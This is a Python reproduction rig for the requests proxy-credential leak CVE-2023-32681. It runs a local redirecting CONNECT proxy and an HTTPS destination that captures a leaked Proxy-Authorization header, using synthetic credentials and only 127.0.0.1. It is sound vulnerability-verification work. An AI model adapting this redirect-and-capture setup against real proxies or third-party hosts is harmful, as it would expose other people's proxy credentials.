"""Offline reproduction rig for CVE-2023-32681.

CVE-2023-32681: in ``requests`` < 2.31.0 the ``Proxy-Authorization`` header
survives a redirect to an ``https`` destination and is disclosed to that
destination host, leaking proxy credentials. Patched in 2.31.0.

Root cause (``requests/sessions.py``::``Session.rebuild_proxies``):

    # 2.30.0 (vulnerable)
    if username and password:
        headers["Proxy-Authorization"] = _basic_auth_str(username, password)

    # 2.31.0 (patched) -- guard added
    if not scheme.startswith("https") and username and password:
        headers["Proxy-Authorization"] = _basic_auth_str(username, password)

On a redirect, ``rebuild_proxies`` re-derives ``Proxy-Authorization`` from the
proxy URL's credentials and re-attaches it to the *destination-bound* request.
When the destination is ``https`` the request is carried inside the proxy's
CONNECT tunnel, so on 2.30.0 the header travels through the tunnel and reaches
the destination server. The 2.31.0 guard suppresses it for https targets.

The rig is fully offline and uses two local servers only (CLAUDE.md hard
rule 2):

    server A  HTTP origin. GET /start -> 301 redirect to https://<B>/dest.
              Doubles as the CONNECT proxy the client is configured to use.
    server B  HTTPS destination. Records the headers it receives *inside the
              tunnel* -- i.e. what the origin's redirect target actually sees.

The client's proxy is configured with credentials in the URL
(``http://user:pass@A``). That is what makes requests generate the
``Proxy-Authorization`` header in the first place; the rig never fabricates
the header by hand. Everything binds to 127.0.0.1; nothing leaves the host.

This module is the reproduction rig only. It asserts that the insecure
behaviour occurs (CLAUDE.md hard rule 3). It is not a weaponised exploit and
is never pointed at a host we do not own.
"""

from __future__ import annotations

import base64
import select
import shutil
import socket
import ssl
import subprocess
import tempfile
import threading
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests
import urllib3

# Proxy credentials embedded in the proxy URL. These are synthetic sandbox
# demo values (CLAUDE.md hard rule 1 / hard rule 4), not a real secret.
PROXY_USER = "proxyuser"
PROXY_PASS = "s3cr3t-proxy-pw"
EXPECTED_LEAK_HEADER = "Basic " + base64.b64encode(
    f"{PROXY_USER}:{PROXY_PASS}".encode()
).decode()


@dataclass
class ProbeResult:
    """What each hop observed during one run through the rig."""

    requests_version: str
    # Header value the destination (server B) saw inside the tunnel.
    # Non-None means the proxy credential leaked to the destination.
    dest_proxy_auth: str | None
    # Header value the proxy (server A's CONNECT handler) saw. This is the
    # legitimate use of the header and is expected to be present on any version.
    connect_proxy_auth: str | None
    final_status: int
    final_url: str
    errors: list = field(default_factory=list)

    @property
    def leaked(self) -> bool:
        return self.dest_proxy_auth is not None


def _make_self_signed_cert(dest_dir: str) -> tuple[str, str]:
    """Generate a throwaway self-signed cert for 127.0.0.1 via the openssl CLI.

    Written to a temp dir and deleted when the rig shuts down, so no key or
    cert material is ever committed (CLAUDE.md hard rule 1; see .gitignore).
    """
    if shutil.which("openssl") is None:
        raise RuntimeError("openssl CLI is required to generate the sandbox TLS cert")
    cert_path = f"{dest_dir}/cert.pem"
    key_path = f"{dest_dir}/key.pem"
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_path, "-out", cert_path,
            "-days", "1", "-nodes", "-subj", "/CN=127.0.0.1",
            "-addext", "subjectAltName=IP:127.0.0.1",
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return cert_path, key_path


class _QuietThreadingHTTPServer(ThreadingHTTPServer):
    """Threaded server that swallows the noisy tracebacks a torn-down TLS
    tunnel produces (ConnectionReset / SSL errors are expected here)."""

    daemon_threads = True
    allow_reuse_address = True

    def handle_error(self, request, client_address):  # noqa: D102
        pass


class TwoServerRig:
    """Context manager that stands up servers A and B and probes the leak."""

    def __init__(self) -> None:
        self._tmpdir = tempfile.mkdtemp(prefix="cve-2023-32681-")
        self._cert, self._key = _make_self_signed_cert(self._tmpdir)
        self.captured: dict[str, str | None] = {
            "dest_proxy_auth": None,
            "connect_proxy_auth": None,
        }
        self._server_b = self._start_server_b()
        self.port_b = self._server_b.server_address[1]
        self._server_a = self._start_server_a(self.port_b)
        self.port_a = self._server_a.server_address[1]

    # -- server B: HTTPS destination -------------------------------------
    def _start_server_b(self) -> _QuietThreadingHTTPServer:
        captured = self.captured

        class DestHandler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def do_GET(self):  # noqa: N802
                captured["dest_proxy_auth"] = self.headers.get("Proxy-Authorization")
                body = b"reached-server-B"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):  # noqa: D102
                pass

        server = _QuietThreadingHTTPServer(("127.0.0.1", 0), DestHandler)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self._cert, self._key)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server

    # -- server A: HTTP origin + CONNECT proxy ---------------------------
    def _start_server_a(self, port_b: int) -> _QuietThreadingHTTPServer:
        captured = self.captured

        class OriginProxyHandler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def do_GET(self):  # noqa: N802 -- origin role: redirect to https B
                self.send_response(301)
                self.send_header("Location", f"https://127.0.0.1:{port_b}/dest")
                self.send_header("Content-Length", "0")
                self.end_headers()

            def do_CONNECT(self):  # noqa: N802 -- proxy role: blind TCP tunnel
                # The header the proxy legitimately receives on the CONNECT
                # line. Present on every version; not the leak.
                captured["connect_proxy_auth"] = self.headers.get(
                    "Proxy-Authorization"
                )
                host, _, port = self.path.partition(":")
                try:
                    upstream = socket.create_connection((host, int(port)), timeout=10)
                except OSError:
                    self.send_error(502, "Bad Gateway")
                    return
                self.send_response(200, "Connection established")
                self.end_headers()
                client = self.connection
                socks = [client, upstream]
                try:
                    while True:
                        readable, _, _ = select.select(socks, [], [], 10)
                        if not readable:
                            break
                        for s in readable:
                            data = s.recv(65536)
                            if not data:
                                return
                            (upstream if s is client else client).sendall(data)
                except OSError:
                    pass  # expected when either side tears down the tunnel
                finally:
                    upstream.close()

            def log_message(self, *a):  # noqa: D102
                pass

        server = _QuietThreadingHTTPServer(("127.0.0.1", 0), OriginProxyHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server

    # -- client probe -----------------------------------------------------
    def probe(self) -> ProbeResult:
        """Drive one request through the rig and report what each hop saw."""
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        session = requests.Session()
        # Hermetic: ignore ambient HTTPS_PROXY / REQUESTS_CA_BUNDLE so the run
        # stays entirely on 127.0.0.1 and touches no external host.
        session.trust_env = False
        session.verify = False  # self-signed sandbox cert; TLS trust is not what we test
        session.proxies = {
            "https": f"http://{PROXY_USER}:{PROXY_PASS}@127.0.0.1:{self.port_a}",
        }
        errors: list = []
        status, url = 0, ""
        try:
            resp = session.get(
                f"http://127.0.0.1:{self.port_a}/start", timeout=10, verify=False
            )
            status, url = resp.status_code, resp.url
        except requests.RequestException as exc:  # pragma: no cover - diagnostic
            errors.append(repr(exc))
        finally:
            session.close()
        return ProbeResult(
            requests_version=requests.__version__,
            dest_proxy_auth=self.captured["dest_proxy_auth"],
            connect_proxy_auth=self.captured["connect_proxy_auth"],
            final_status=status,
            final_url=url,
            errors=errors,
        )

    def close(self) -> None:
        self._server_a.shutdown()
        self._server_b.shutdown()
        self._server_a.server_close()
        self._server_b.server_close()
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def __enter__(self) -> "TwoServerRig":
        return self

    def __exit__(self, *exc) -> None:
        self.close()


def run_probe() -> ProbeResult:
    """Convenience one-shot: stand up the rig, probe, tear down."""
    with TwoServerRig() as rig:
        return rig.probe()


if __name__ == "__main__":
    result = run_probe()
    print(f"requests               : {result.requests_version}")
    print(f"final response         : {result.final_status} {result.final_url}")
    print(f"proxy saw (CONNECT)    : {result.connect_proxy_auth!r}   <- legitimate")
    print(f"destination B received : {result.dest_proxy_auth!r}")
    if result.errors:
        print(f"errors                 : {result.errors}")
    print()
    if result.leaked:
        print("RESULT: LEAK -- proxy credentials disclosed to the destination host.")
        print("        (vulnerable: requests < 2.31.0, e.g. the pinned 2.30.0)")
    else:
        print("RESULT: no leak -- destination did not receive Proxy-Authorization.")
        print("        (patched: requests >= 2.31.0)")
